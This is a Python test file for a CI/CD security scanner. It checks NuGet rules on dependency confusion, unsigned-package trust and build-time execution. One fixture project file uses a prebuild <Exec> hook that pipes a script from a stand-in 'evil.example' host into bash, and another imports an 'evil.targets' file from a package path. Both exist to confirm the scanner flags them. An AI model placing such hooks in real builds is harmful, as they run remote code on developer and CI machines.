"""Tests for the NuGet dependency-confusion / build-exec batch.

NUGET-016 (private feed without <clear/>), NUGET-018 (build-time
MSBuild execution), NUGET-019 (require mode with no trusted signers).
"""
from __future__ import annotations

import pathlib

from pipeline_check.core.checks.nuget.base import NuGetContext
from pipeline_check.core.checks.nuget.pipelines import NuGetChecks


def _scan(tmp_path: pathlib.Path, files: dict[str, str]):
    for rel, content in files.items():
        path = tmp_path / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
    ctx = NuGetContext.from_path(tmp_path)
    return {f.check_id: f for f in NuGetChecks(ctx).run()}


def _config(body: str) -> str:
    return (
        '<?xml version="1.0"?>\n'
        "<configuration>\n"
        f"{body}"
        "</configuration>\n"
    )


# ── NUGET-016 ──────────────────────────────────────────────────────


class TestNuget016MissingClear:
    def test_private_feed_without_clear_fails(self, tmp_path):
        findings = _scan(tmp_path, {
            "NuGet.config": _config(
                "  <packageSources>\n"
                '    <add key="internal" value="https://nuget.corp.local/v3/index.json" />\n'
                "  </packageSources>\n"
            ),
        })
        assert not findings["NUGET-016"].passed

    def test_private_feed_with_clear_passes(self, tmp_path):
        findings = _scan(tmp_path, {
            "NuGet.config": _config(
                "  <packageSources>\n"
                "    <clear />\n"
                '    <add key="internal" value="https://nuget.corp.local/v3/index.json" />\n'
                '    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />\n'
                "  </packageSources>\n"
            ),
        })
        assert findings["NUGET-016"].passed

    def test_only_public_gallery_passes(self, tmp_path):
        findings = _scan(tmp_path, {
            "NuGet.config": _config(
                "  <packageSources>\n"
                '    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />\n'
                "  </packageSources>\n"
            ),
        })
        assert findings["NUGET-016"].passed

    def test_no_config_no_finding(self, tmp_path):
        findings = _scan(tmp_path, {
            "src/App.csproj": "<Project></Project>\n",
        })
        assert "NUGET-016" not in findings


# ── NUGET-019 ──────────────────────────────────────────────────────


class TestNuget019RequireWithoutTrustedSigners:
    def test_require_without_signers_fails(self, tmp_path):
        findings = _scan(tmp_path, {
            "NuGet.config": _config(
                "  <config>\n"
                '    <add key="signatureValidationMode" value="require" />\n'
                "  </config>\n"
            ),
        })
        assert not findings["NUGET-019"].passed

    def test_require_with_certificate_passes(self, tmp_path):
        findings = _scan(tmp_path, {
            "NuGet.config": _config(
                "  <config>\n"
                '    <add key="signatureValidationMode" value="require" />\n'
                "  </config>\n"
                "  <trustedSigners>\n"
                '    <repository name="nuget.org" serviceIndex="https://api.nuget.org/v3/index.json">\n'
                '      <certificate fingerprint="ABC" hashAlgorithm="SHA256" />\n'
                "    </repository>\n"
                "  </trustedSigners>\n"
            ),
        })
        assert findings["NUGET-019"].passed

    def test_require_with_empty_signers_fails(self, tmp_path):
        findings = _scan(tmp_path, {
            "NuGet.config": _config(
                "  <config>\n"
                '    <add key="signatureValidationMode" value="require" />\n'
                "  </config>\n"
                "  <trustedSigners>\n"
                '    <author name="contoso" />\n'
                "  </trustedSigners>\n"
            ),
        })
        assert not findings["NUGET-019"].passed

    def test_accept_mode_passes_here(self, tmp_path):
        # Not this rule's domain; NUGET-012 owns the mode itself.
        findings = _scan(tmp_path, {
            "NuGet.config": _config(
                "  <config>\n"
                '    <add key="signatureValidationMode" value="accept" />\n'
                "  </config>\n"
            ),
        })
        assert findings["NUGET-019"].passed

    def test_absent_mode_passes_here(self, tmp_path):
        findings = _scan(tmp_path, {
            "NuGet.config": _config(
                "  <config>\n"
                '    <add key="other" value="x" />\n'
                "  </config>\n"
            ),
        })
        assert findings["NUGET-019"].passed


# ── NUGET-018 ──────────────────────────────────────────────────────


class TestNuget018BuildTimeExec:
    def test_exec_before_build_fails(self, tmp_path):
        findings = _scan(tmp_path, {
            "src/App.csproj": (
                '<Project Sdk="Microsoft.NET.Sdk">\n'
                '  <Target Name="Prebuild" BeforeTargets="Build">\n'
                '    <Exec Command="curl https://evil.example/x.sh | bash" />\n'
                "  </Target>\n"
                "</Project>\n"
            ),
        })
        assert not findings["NUGET-018"].passed

    def test_package_path_import_fails(self, tmp_path):
        findings = _scan(tmp_path, {
            "src/App.csproj": (
                '<Project Sdk="Microsoft.NET.Sdk">\n'
                "  <ItemGroup>\n"
                '    <PackageReference Include="Some.Pkg" Version="1.0.0" GeneratePathProperty="true" />\n'
                "  </ItemGroup>\n"
                '  <Import Project="$(PkgSome_Pkg)\\build\\evil.targets" />\n'
                "</Project>\n"
            ),
        })
        assert not findings["NUGET-018"].passed

    def test_plain_project_passes(self, tmp_path):
        findings = _scan(tmp_path, {
            "src/App.csproj": (
                '<Project Sdk="Microsoft.NET.Sdk">\n'
                "  <ItemGroup>\n"
                '    <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />\n'
                "  </ItemGroup>\n"
                "</Project>\n"
            ),
        })
        assert findings["NUGET-018"].passed

    def test_exec_on_custom_target_passes(self, tmp_path):
        # An <Exec> only runs automatically when hooked to a build
        # phase; an AfterTargets pointing at a custom target does not.
        findings = _scan(tmp_path, {
            "src/App.csproj": (
                '<Project Sdk="Microsoft.NET.Sdk">\n'
                '  <Target Name="Helper" AfterTargets="SomeCustomThing">\n'
                '    <Exec Command="echo hello" />\n'
                "  </Target>\n"
                "</Project>\n"
            ),
        })
        assert findings["NUGET-018"].passed
